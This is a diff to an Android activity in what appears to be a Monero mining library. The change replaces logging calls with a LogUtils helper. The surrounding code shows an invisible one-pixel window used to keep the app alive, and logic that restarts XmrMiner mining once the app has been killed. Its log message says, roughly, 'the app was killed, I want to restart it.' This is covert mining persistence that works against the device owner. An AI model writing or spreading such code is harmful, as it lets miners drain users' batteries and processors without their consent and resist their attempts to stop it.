@@ -11,6 +11,7 @@ import android.view.Window;
 import android.view.WindowManager;
 
 import waterhole.miner.core.StateObserver;
+import waterhole.miner.core.utils.LogUtils;
 import waterhole.miner.monero.XmrMiner;
 import waterhole.miner.monero.keepappalive.utils.ScreenManager;
 import waterhole.miner.monero.keepappalive.utils.SystemUtils;
@@ -20,12 +21,10 @@ import waterhole.miner.monero.keepappalive.utils.SystemUtils;
  */
 public class SinglePixelActivity extends Activity {
 
-    private static final String TAG = "SinglePixelActivity";
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        Log.d(TAG, "onCreate--->启动1像素保活");
+        LogUtils.info("onCreate--->启动1像素保活");
         Window mWindow = getWindow();
         mWindow.setGravity(Gravity.LEFT | Gravity.TOP);
         WindowManager.LayoutParams attrParams = mWindow.getAttributes();
@@ -40,7 +39,7 @@ public class SinglePixelActivity extends Activity {
 
     @Override
     protected void onDestroy() {
-        Log.d(TAG, "onDestroy--->1像素保活被终止");
+        LogUtils.info("onDestroy--->1像素保活被终止");
         if (!SystemUtils.isAPPALive(this)) {
             if (!XmrMiner.instance().isMining()) {
                 XmrMiner.instance().init(getApplicationContext()).setStateObserver(new StateObserver() {
@@ -81,7 +80,7 @@ public class SinglePixelActivity extends Activity {
                     }
                 }).startMine();
             }
-            Log.i(TAG, "SinglePixelActivity---->APP被干掉了，我要重启它");
+            LogUtils.info("SinglePixelActivity---->APP被干掉了，我要重启它");
         }
         super.onDestroy();
     }
